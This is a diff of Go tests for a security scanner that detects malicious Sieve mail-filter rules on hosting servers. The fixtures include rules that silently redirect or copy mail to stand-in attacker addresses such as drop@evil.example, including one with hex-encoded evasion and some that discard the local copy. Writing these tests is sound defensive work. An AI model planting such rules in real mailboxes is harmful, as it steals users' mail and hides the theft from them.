@@ -48,6 +48,42 @@ func TestParseSieveRedirectCopyIsStealthExfil(t *testing.T) {
 	}
 }
 
+func TestParseSieveKnownCopyForwardIsSuppressed(t *testing.T) {
+	mb := filterMailbox{localPart: "assistant", domain: "example.com"}
+	known := []string{"assistant@example.com: partner@external.example"}
+	body := `if true { redirect :copy "partner@external.example"; }`
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, known)
+	if len(got) != 0 {
+		t.Fatalf("expected copy-forward produced findings: %+v", got)
+	}
+}
+
+func TestParseSieveKnownForwarderDoesNotSuppressExplicitStealth(t *testing.T) {
+	mb := filterMailbox{localPart: "assistant", domain: "example.com"}
+	known := []string{"assistant@example.com: partner@external.example"}
+	body := `if header :contains "subject" "invoice" {
+	redirect "partner@external.example";
+	keep;
+}`
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, known)
+	if len(got) != 1 || got[0].kind != "exfil" || got[0].severity != alert.Critical {
+		t.Fatalf("explicit stealth was suppressed: %+v", got)
+	}
+}
+
+func TestParseSieveKnownCopyDoesNotSuppressDiscard(t *testing.T) {
+	mb := filterMailbox{localPart: "assistant", domain: "example.com"}
+	known := []string{"assistant@example.com: partner@external.example"}
+	body := `if header :contains "subject" "invoice" {
+	redirect :copy "partner@external.example";
+	discard;
+}`
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, known)
+	if len(got) != 1 || got[0].kind != "exfil" || got[0].severity != alert.Critical {
+		t.Fatalf("copy-and-discard interception was suppressed: %+v", got)
+	}
+}
+
 func TestParseSievePlainUnconditionalRedirectIsExfil(t *testing.T) {
 	// redirect without :copy cancels the implicit keep, but forwarding ALL mail
 	// externally is still a mailbox takeover, not a benign selective forward.
@@ -133,6 +169,107 @@ func TestParseSieveRedirectDiscardHidesLocalCopy(t *testing.T) {
 	}
 }
 
+func TestParseSieveUnconditionalDiscardIsBlackhole(t *testing.T) {
+	mb := filterMailbox{localPart: "aura", domain: "example.com"}
+	got := scoreSieve(t, `if true { discard; }`, mb, map[string]bool{"example.com": true}, nil)
+	if len(got) != 1 || got[0].check != "email_filter_blackhole" || got[0].severity != alert.High {
+		t.Fatalf("unconditional discard findings = %+v, want one High blackhole", got)
+	}
+
+	got = scoreSieve(t, `if header :contains "subject" "spam" { discard; }`, mb, map[string]bool{"example.com": true}, nil)
+	if len(got) != 0 {
+		t.Fatalf("selective discard produced blackhole findings: %+v", got)
+	}
+}
+
+func TestParseSieveStopPreventsFollowingActions(t *testing.T) {
+	body := `if header :contains "subject" "invoice"
+{
+	redirect "billing@partner.example";
+	stop;
+	keep;
+}`
+	mb := filterMailbox{localPart: "office", domain: "example.com"}
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
+	if len(got) != 1 || got[0].kind != "forwarder" || !got[0].onlyIfNew {
+		t.Fatalf("actions after stop affected scoring: %+v", got)
+	}
+}
+
+func TestParseSieveConditionalStopMakesFollowingRedirectSelective(t *testing.T) {
+	body := `if header :contains "subject" "internal"
+{
+	stop;
+}
+redirect "archive@external.example";
+`
+	mb := filterMailbox{localPart: "office", domain: "example.com"}
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
+	if len(got) != 1 || got[0].kind != "forwarder" || !got[0].onlyIfNew {
+		t.Fatalf("redirect after conditional stop was scored as unconditional: %+v", got)
+	}
+}
+
+func TestParseSieveAllBranchesStopMakesFollowingActionUnreachable(t *testing.T) {
+	body := `if header :contains "subject" "internal" {
+	stop;
+} else {
+	stop;
+}
+redirect "archive@external.example";
+`
+	mb := filterMailbox{localPart: "office", domain: "example.com"}
+	if got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil); len(got) != 0 {
+		t.Fatalf("unreachable redirect after stopping branch chain produced findings: %+v", got)
+	}
+}
+
+func TestParseSieveNestedStopsMakeFollowingActionUnreachable(t *testing.T) {
+	body := `if true {
+	if header :contains "subject" "internal" { stop; }
+	else { stop; }
+}
+redirect "archive@external.example";
+`
+	mb := filterMailbox{localPart: "office", domain: "example.com"}
+	if got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil); len(got) != 0 {
+		t.Fatalf("redirect after nested stopping chain produced findings: %+v", got)
+	}
+}
+
+func TestParseSieveRedirectBeforeConditionalStopStillMatchesAll(t *testing.T) {
+	body := `redirect "archive@external.example";
+if header :contains "subject" "internal" {
+	stop;
+}`
+	mb := filterMailbox{localPart: "office", domain: "example.com"}
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
+	if len(got) != 1 || got[0].kind != "exfil" || got[0].severity != alert.Critical {
+		t.Fatalf("redirect before conditional stop lost match-all scoring: %+v", got)
+	}
+}
+
+func TestParseSieveIgnoresInvalidUnterminatedAction(t *testing.T) {
+	body := `if true { redirect :copy "attacker@evil.example" }`
+	mb := filterMailbox{localPart: "u", domain: "example.com"}
+	if got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil); len(got) != 0 {
+		t.Fatalf("invalid unterminated action produced findings: %+v", got)
+	}
+}
+
+func TestParseSieveInvalidFileintoDoesNotInventLocalCopy(t *testing.T) {
+	body := `if header :contains "subject" "invoice"
+{
+	redirect "billing@partner.example";
+	fileinto;
+}`
+	mb := filterMailbox{localPart: "office", domain: "example.com"}
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
+	if len(got) != 1 || got[0].kind != "forwarder" || !got[0].onlyIfNew {
+		t.Fatalf("invalid fileinto invented stealth delivery: %+v", got)
+	}
+}
+
 func TestParseSieveSameDomainRedirectIgnored(t *testing.T) {
 	// contact@franchisebucharest.com -> florin@franchisebucharest.com: a legit
 	// same-domain copy-forward, not an external exfil.
@@ -146,6 +283,25 @@ if true
 	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
 	if len(got) != 0 {
 		t.Fatalf("same-domain copy-forward produced findings: %+v", got)
+	}
+}
+
+func TestParseSieveSameDomainNamedRedirectIgnored(t *testing.T) {
+	body := `if true { redirect :copy "Local Partner <florin@example.com>"; }`
+	mb := filterMailbox{localPart: "contact", domain: "example.com"}
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
+	if len(got) != 0 {
+		t.Fatalf("same-domain named redirect produced findings: %+v", got)
+	}
+}
+
+func TestParseSieveDecodesExternalRedirectAddress(t *testing.T) {
+	body := `require ["copy", "encoded-character"];
+if true { redirect :copy "drop${hex:40}evil.example"; }`
+	mb := filterMailbox{localPart: "contact", domain: "example.com"}
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
+	if len(got) != 1 || got[0].kind != "exfil" || got[0].dest != "drop@evil.example" {
+		t.Fatalf("encoded external redirect escaped detection: %+v", got)
 	}
 }
 
@@ -164,6 +320,19 @@ if true
 	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
 	if len(got) != 1 || got[0].dest != "real@evil.example" {
 		t.Fatalf("findings = %+v, want single finding for real@evil.example", got)
+	}
+}
+
+func TestParseSieveTreatsMultilineStringsAsOpaque(t *testing.T) {
+	body := `require ["vacation"];
+vacation text:
+This prose mentions redirect :copy "decoy@evil.example";
+.
+;
+`
+	mb := filterMailbox{localPart: "u", domain: "example.com"}
+	if got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil); len(got) != 0 {
+		t.Fatalf("action-like vacation prose produced findings: %+v", got)
 	}
 }
 
@@ -194,16 +363,54 @@ func TestSieveTestMatchesAll(t *testing.T) {
 		{"true", "true", true},
 		{"false", "false", false},
 		{"anyof true", `anyof (true, header :contains "subject" "x")`, true},
+		{"allof true and match-all", `allof (true, header :contains "from" "@")`, true},
+		{"allof with restriction", `allof (true, header :contains "subject" "invoice")`, false},
+		{"anyof with match-all", `anyof (header :contains "subject" "invoice", header :contains "from" "@")`, true},
 		{"header contains at", `header :contains "from" "@"`, true},
+		{"header contains empty", `header :contains "from" ""`, true},
 		{"address contains at", `address :all :contains "from" "@"`, true},
+		{"address localpart contains at", `address :localpart :contains "from" "@"`, false},
+		{"address localpart wildcard", `address :localpart :matches "from" "*"`, true},
+		{"header list key", `header :contains ["subject", "from"] ["invoice", "@"]`, true},
+		{"indexed from not universal", `header :index 2 :contains "from" "@"`, false},
+		{"MIME-scoped from not universal", `header :mime :contains "from" "@"`, false},
 		{"restrictive subject", `header :contains "subject" "invoice"`, false},
+		{"subject contains at", `header :contains "subject" "@"`, false},
+		{"is is not wildcard", `header :is "from" "*@*"`, false},
 		{"negated", `not header :contains "subject" "x"`, false},
+		{"negated match-all", `not header :contains "from" "@"`, false},
 	}
 	for _, tt := range tests {
 		got := sieveTestMatchesAll(tokenizeSieve(tt.test))
 		if got != tt.want {
 			t.Errorf("sieveTestMatchesAll(%q) = %v, want %v", tt.test, got, tt.want)
 		}
+	}
+}
+
+func TestParseSieveBranchReachability(t *testing.T) {
+	mb := filterMailbox{localPart: "u", domain: "example.com"}
+	local := map[string]bool{"example.com": true}
+
+	if got := scoreSieve(t, `if false { redirect "drop@evil.example"; }`, mb, local, nil); len(got) != 0 {
+		t.Fatalf("unreachable false branch produced findings: %+v", got)
+	}
+	got := scoreSieve(t, `if false { keep; } elsif true { redirect "drop@evil.example"; }`, mb, local, nil)
+	if len(got) != 1 || got[0].kind != "exfil" || got[0].severity != alert.Critical {
+		t.Fatalf("always-reached elsif was not match-all: %+v", got)
+	}
+	if got := scoreSieve(t, `if true { keep; } else { redirect "drop@evil.example"; }`, mb, local, nil); len(got) != 0 {
+		t.Fatalf("unreachable else branch produced findings: %+v", got)
+	}
+}
+
+func TestParseSieveDeepNestingTerminates(t *testing.T) {
+	body := "keep;" + strings.Repeat(`if header :contains "subject" "invoice" {`, 2000) +
+		`redirect "drop@evil.example";` + strings.Repeat("}", 2000)
+	mb := filterMailbox{localPart: "u", domain: "example.com"}
+	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
+	if len(got) != 1 || got[0].kind != "exfil" {
+		t.Fatalf("deep nesting lost inherited keep: %+v", got)
 	}
 }
 
@@ -214,6 +421,7 @@ func TestMailboxFromSievePath(t *testing.T) {
 	}{
 		{"/home/u/mail/example.com/aura/sieve/roundcube.sieve", filterMailbox{localPart: "aura", domain: "example.com"}},
 		{"/home/u/mail/example.com/aura/.dovecot.sieve", filterMailbox{localPart: "aura", domain: "example.com"}},
+		{"/home/mail/mail/example.com/aura/sieve/roundcube.sieve", filterMailbox{localPart: "aura", domain: "example.com"}},
 	}
 	for _, tt := range tests {
 		if got := mailboxFromSievePath(tt.path); got != tt.mb {
@@ -290,6 +498,12 @@ func TestCheckMailFiltersSkipsSymlinkDovecotSieve(t *testing.T) {
 			}
 			return &fakeFileInfoMtime{name: filepath.Base(name), mode: 0o644, mtime: now}, nil
 		},
+		readlink: func(name string) (string, error) {
+			if name == activePath {
+				return filepath.Join("sieve", "roundcube.sieve"), nil
+			}
+			return "", os.ErrNotExist
+		},
 		readFile: func(name string) ([]byte, error) {
 			switch name {
 			case "/etc/localdomains":
@@ -307,6 +521,226 @@ func TestCheckMailFiltersSkipsSymlinkDovecotSieve(t *testing.T) {
 	}
 	if findings[0].FilePath != scriptPath {
 		t.Errorf("FilePath = %q, want the real script %q", findings[0].FilePath, scriptPath)
+	}
+}
+
+func TestCheckMailFiltersSymlinkDoesNotConsumeFileCap(t *testing.T) {
+	withTestStore(t)
+	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
+	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
+	dormantPath := "/home/victim/mail/example.com/box/sieve/newer-dormant.sieve"
+	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			switch pattern {
+			case filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve"):
+				return []string{scriptPath, dormantPath}, nil
+			case filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve"):
+				return []string{activePath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{
+			scriptPath:  now.Add(-time.Hour),
+			dormantPath: now,
+			activePath:  now.Add(time.Minute),
+		}),
+		lstat: func(name string) (os.FileInfo, error) {
+			if name == activePath {
+				return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
+			}
+			return nil, os.ErrNotExist
+		},
+		readlink: func(name string) (string, error) {
+			if name == activePath {
+				return filepath.Join("sieve", "roundcube.sieve"), nil
+			}
+			return "", os.ErrNotExist
+		},
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case scriptPath:
+				return []byte(sieveAuraStealth), nil
+			case dormantPath:
+				return []byte("keep;\n"), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	cfg := &config.Config{}
+	cfg.Thresholds.AccountScanMaxFiles = 1
+	findings := CheckMailFilters(context.Background(), cfg, nil)
+	if len(findings) != 1 || findings[0].FilePath != scriptPath {
+		t.Fatalf("symlink alias crowded source out of capped scan: %+v", findings)
+	}
+}
+
+func TestCheckMailFiltersScansDovecotSieveOnLstatErrorOnce(t *testing.T) {
+	withTestStore(t)
+	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
+	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve") {
+				return []string{activePath, activePath}, nil
+			}
+			return nil, nil
+		},
+		stat:  mtimesByPath(map[string]time.Time{activePath: now}),
+		lstat: func(string) (os.FileInfo, error) { return nil, os.ErrPermission },
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case activePath:
+				return []byte(sieveAuraStealth), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
+	if len(findings) != 1 || findings[0].FilePath != activePath {
+		t.Fatalf("Lstat failure skipped or duplicated active script: %+v", findings)
+	}
+}
+
+func TestCheckMailFiltersScansSymlinkToUnusualTarget(t *testing.T) {
+	withTestStore(t)
+	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
+	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve") {
+				return []string{activePath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{activePath: now}),
+		lstat: func(string) (os.FileInfo, error) {
+			return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
+		},
+		readlink: func(string) (string, error) { return "../../outside/active.sieve", nil },
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case activePath:
+				return []byte(sieveAuraStealth), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
+	if len(findings) != 1 || findings[0].FilePath != activePath {
+		t.Fatalf("unusual active symlink target was skipped: %+v", findings)
+	}
+}
+
+func TestCheckMailFiltersDoesNotDedupCrossMailboxActiveSymlink(t *testing.T) {
+	withTestStore(t)
+	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
+	scriptPath := "/home/source/mail/example.com/source/sieve/shared.sieve"
+	activePath := "/home/victim/mail/example.com/victim/.dovecot.sieve"
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			switch pattern {
+			case filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve"):
+				return []string{scriptPath}, nil
+			case filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve"):
+				return []string{activePath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{scriptPath: now, activePath: now}),
+		lstat: func(name string) (os.FileInfo, error) {
+			if name == activePath {
+				return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
+			}
+			return nil, os.ErrNotExist
+		},
+		readlink: func(name string) (string, error) {
+			if name == activePath {
+				return scriptPath, nil
+			}
+			return "", os.ErrNotExist
+		},
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case scriptPath, activePath:
+				return []byte(sieveAuraStealth), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	cfg := &config.Config{}
+	cfg.Thresholds.AccountScanMaxFiles = 1
+	findings := CheckMailFilters(context.Background(), cfg, nil)
+	if len(findings) != 1 || findings[0].FilePath != activePath || findings[0].Mailbox != "victim@example.com" {
+		t.Fatalf("cross-mailbox active script was deduplicated or misattributed: %+v", findings)
+	}
+}
+
+func TestCheckMailFiltersFlagsNewlyActivatedExistingSieve(t *testing.T) {
+	db := withTestStore(t)
+	if err := db.SetMetaString("email:mailfilter_last_refresh", "2026-08-12T12:00:00Z"); err != nil {
+		t.Fatal(err)
+	}
+	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
+	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
+	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"
+	body := `if header :contains "subject" "invoice" { redirect "partner@external.example"; }`
+	if err := db.SetForwarderHash("mailsieve:"+scriptPath, sha256Hex([]byte(body))); err != nil {
+		t.Fatal(err)
+	}
+	oldTarget := "/home/victim/mail/example.com/box/sieve/old.sieve"
+	if err := db.SetForwarderHash("mailsieve-active:"+activePath, sha256Hex([]byte(oldTarget))); err != nil {
+		t.Fatal(err)
+	}
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			switch pattern {
+			case filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve"):
+				return []string{scriptPath}, nil
+			case filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve"):
+				return []string{activePath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{scriptPath: now}),
+		lstat: func(string) (os.FileInfo, error) {
+			return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
+		},
+		readlink: func(string) (string, error) { return filepath.Join("sieve", "roundcube.sieve"), nil },
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case scriptPath:
+				return []byte(body), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	previousForceAll := ForceAll
+	ForceAll = true
+	t.Cleanup(func() { ForceAll = previousForceAll })
+	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
+	if len(findings) != 1 || findings[0].Check != "email_filter_forwarder" {
+		t.Fatalf("newly activated existing script was not treated as new: %+v", findings)
 	}
 }
 
@@ -342,5 +776,152 @@ func TestCheckMailFiltersScansStandaloneDovecotSieve(t *testing.T) {
 	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
 	if len(findings) != 1 || findings[0].Check != "email_filter_exfil" {
 		t.Fatalf("standalone .dovecot.sieve not scanned: %+v", findings)
+	}
+}
+
+func TestCheckMailFiltersAccountScanHashesSieveWithoutBaselining(t *testing.T) {
+	db := withTestStore(t)
+	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
+	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
+	body := `if header :contains "subject" "invoice" { redirect "partner@external.example"; }`
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			scoped := filepath.Join("/home", "victim", "mail", "*", "*", "sieve", "*.sieve")
+			host := filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve")
+			if pattern == scoped || pattern == host {
+				return []string{scriptPath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{scriptPath: now}),
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case scriptPath:
+				return []byte(body), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	ctx := ContextWithAccountScope(context.Background(), "victim")
+	if findings := CheckMailFilters(ctx, &config.Config{}, nil); len(findings) != 0 {
+		t.Fatalf("first account scan should establish only the file hash: %+v", findings)
+	}
+	if got := db.GetMetaString("email:mailfilter_last_refresh"); got != "" {
+		t.Fatalf("account scan established shared baseline %q", got)
+	}
+	if got := db.GetMetaString("email:mailsieve_last_refresh"); got != "" {
+		t.Fatalf("account scan established Sieve baseline %q", got)
+	}
+	oldHash, ok := db.GetForwarderHash("mailsieve:" + scriptPath)
+	if !ok || oldHash != sha256Hex([]byte(body)) {
+		t.Fatalf("account scan hash = %q, %v; want current Sieve hash", oldHash, ok)
+	}
+
+	body = `if header :contains "subject" "invoice" { redirect "drop@evil.example"; }`
+	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
+	if len(findings) != 1 || findings[0].Check != "email_filter_forwarder" {
+		t.Fatalf("later Sieve plant was hidden by account scan: %+v", findings)
+	}
+}
+
+func TestCheckMailFiltersAccountScanBypassesHostThrottle(t *testing.T) {
+	db := withTestStore(t)
+	mailBaseline := time.Now().Format(time.RFC3339)
+	sieveBaseline := time.Now().Add(-time.Minute).Format(time.RFC3339)
+	if err := db.SetMetaString("email:mailfilter_last_refresh", mailBaseline); err != nil {
+		t.Fatal(err)
+	}
+	if err := db.SetMetaString("email:mailsieve_last_refresh", sieveBaseline); err != nil {
+		t.Fatal(err)
+	}
+
+	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
+	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
+	body := `if header :contains "subject" "invoice" { redirect "drop@evil.example"; }`
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == filepath.Join("/home", "victim", "mail", "*", "*", "sieve", "*.sieve") {
+				return []string{scriptPath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{scriptPath: now}),
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case scriptPath:
+				return []byte(body), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	cfg := &config.Config{}
+	cfg.EmailProtection.PasswordCheckIntervalMin = 1440
+	ctx := ContextWithAccountScope(context.Background(), "victim")
+	findings := CheckMailFilters(ctx, cfg, nil)
+	if len(findings) != 1 || findings[0].Check != "email_filter_forwarder" {
+		t.Fatalf("account scan was throttled by host baseline: %+v", findings)
+	}
+	if hash, ok := db.GetForwarderHash("mailsieve:" + scriptPath); !ok || hash != sha256Hex([]byte(body)) {
+		t.Fatalf("account scan hash = %q, %v; want current Sieve hash", hash, ok)
+	}
+	if got := db.GetMetaString("email:mailfilter_last_refresh"); got != mailBaseline {
+		t.Fatalf("account scan changed shared mail-filter marker from %q to %q", mailBaseline, got)
+	}
+	if got := db.GetMetaString("email:mailsieve_last_refresh"); got != sieveBaseline {
+		t.Fatalf("account scan changed shared Sieve marker from %q to %q", sieveBaseline, got)
+	}
+}
+
+func TestCheckMailFiltersUpgradeBaselinesExistingSieve(t *testing.T) {
+	db := withTestStore(t)
+	if err := db.SetMetaString("email:mailfilter_last_refresh", time.Now().Format(time.RFC3339)); err != nil {
+		t.Fatal(err)
+	}
+	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
+	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
+	body := `if header :contains "subject" "invoice" { redirect "partner@external.example"; }`
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve") {
+				return []string{scriptPath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{scriptPath: now}),
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case scriptPath:
+				return []byte(body), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	cfg := &config.Config{}
+	cfg.EmailProtection.PasswordCheckIntervalMin = 1440
+	if findings := CheckMailFilters(context.Background(), cfg, nil); len(findings) != 0 {
+		t.Fatalf("upgrade treated pre-existing Sieve rule as newly planted: %+v", findings)
+	}
+	if got := db.GetMetaString("email:mailsieve_last_refresh"); got == "" {
+		t.Fatal("complete upgrade scan did not establish Sieve baseline")
+	}
+
+	body = `if header :contains "subject" "invoice" { redirect "drop@evil.example"; }`
+	previousForceAll := ForceAll
+	ForceAll = true
+	t.Cleanup(func() { ForceAll = previousForceAll })
+	findings := CheckMailFilters(context.Background(), cfg, nil)
+	if len(findings) != 1 || findings[0].Check != "email_filter_forwarder" {
+		t.Fatalf("post-baseline Sieve change was not detected: %+v", findings)
 	}
 }
